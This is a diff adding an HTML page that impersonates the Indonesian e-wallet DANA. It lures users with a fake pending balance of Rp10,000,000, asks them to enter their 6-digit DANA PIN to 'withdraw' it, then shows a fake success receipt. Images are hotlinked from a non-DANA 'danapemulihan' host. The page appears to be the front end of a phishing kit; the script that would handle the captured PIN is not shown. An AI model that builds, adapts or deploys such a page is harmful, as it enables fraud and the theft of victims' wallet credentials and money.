@@ -1,1 +1,119 @@
 
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DANA - Dompet Digital Indonesia</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container" id="page1">
+        <header class="dana-header">
+            <div class="back-button">&lt;</div>
+            <h1>Saldo Tertunda</h1>
+        </header>
+        
+        <div class="saldo-container">
+            <div class="saldo-pending-animation">
+                <div class="wave-animation"></div>
+                <div class="saldo-amount">Rp10.000.000</div>
+                <div class="saldo-label">Saldo Tertunda</div>
+            </div>
+        </div>
+        
+        <div class="info-box">
+            <div class="info-title">Persyaratan Pencairan</div>
+            <div class="info-content">
+                <div class="requirement-item">
+                    <span class="bullet">1.</span>
+                    <span class="text">Pastikan akun DANA Anda sudah<br><span class="indent">terverifikasi</span></span>
+                </div>
+                <div class="requirement-item">
+                    <span class="bullet">2.</span>
+                    <span class="text">Minimal pencairan Rp10.000.000</span>
+                </div>
+                <div class="requirement-item">
+                    <span class="bullet">3.</span>
+                    <span class="text">Pencairan hanya bisa dilakukan ke<br><span class="indent">rekening bank terdaftar</span></span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="dana-footer">
+            <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="DANA Logo" class="dana-logo">
+            <div class="footer-text">PT. Espay Debit Indonesia Koe.</div>
+        </div>
+        
+        <button class="primary-button" id="nextPage1">Cairkan Sekarang</button>
+    </div>
+    
+    <div class="container hidden" id="page2">
+        <header class="dana-header">
+            <div class="back-button" id="backToPage1">&lt;</div>
+            <h1>Masukkan PIN DANA</h1>
+        </header>
+        
+        <div class="pin-instruction">
+            Masukkan 6 digit PIN DANA Anda untuk melanjutkan pencairan saldo
+        </div>
+        
+        <div class="pin-input-container">
+            <input type="number" pattern="[0-9]*" inputmode="numeric" maxlength="1" class="pin-input" data-index="1" autofocus>
+            <input type="number" pattern="[0-9]*" inputmode="numeric" maxlength="1" class="pin-input" data-index="2">
+            <input type="number" pattern="[0-9]*" inputmode="numeric" maxlength="1" class="pin-input" data-index="3">
+            <input type="number" pattern="[0-9]*" inputmode="numeric" maxlength="1" class="pin-input" data-index="4">
+            <input type="number" pattern="[0-9]*" inputmode="numeric" maxlength="1" class="pin-input" data-index="5">
+            <input type="number" pattern="[0-9]*" inputmode="numeric" maxlength="1" class="pin-input" data-index="6">
+        </div>
+        
+        <div class="forgot-pin">
+            Lupa PIN DANA?
+        </div>
+        
+        <button class="primary-button disabled" id="confirmPin" disabled>Cairkan Saldo</button>
+    </div>
+    
+    <div class="container hidden" id="page3">
+        <header class="dana-header">
+            <div class="back-button hidden">&lt;</div>
+            <h1>Pencairan Berhasil</h1>
+        </header>
+        
+        <div class="success-animation">
+            <div class="checkmark">✓</div>
+        </div>
+        
+        <div class="success-message">
+            <div class="amount">Rp10.000.000</div>
+            <div class="message">telah berhasil dicairkan ke E-wallet Anda</div>
+            <div class="bank-info">E-wallet - ×××××××××</div>
+        </div>
+        
+        <div class="transaction-details">
+            <div class="detail-row">
+                <span>Waktu Transaksi</span>
+                <span id="transaction-time"></span>
+            </div>
+            <div class="detail-row">
+                <span>Biaya Admin</span>
+                <span>Rp0</span>
+            </div>
+            <div class="detail-row">
+                <span>Nomor Referensi</span>
+                <span>DANA<span id="transaction-ref"></span></span>
+            </div>
+        </div>
+        
+        <button class="primary-button" id="finishButton">Selesai</button>
+        
+        <div class="dana-footer">
+            <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="DANA Logo" class="dana-logo">
+            <div class="footer-text">PT. Espay Debit Indonesia Koe.</div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+  </html>
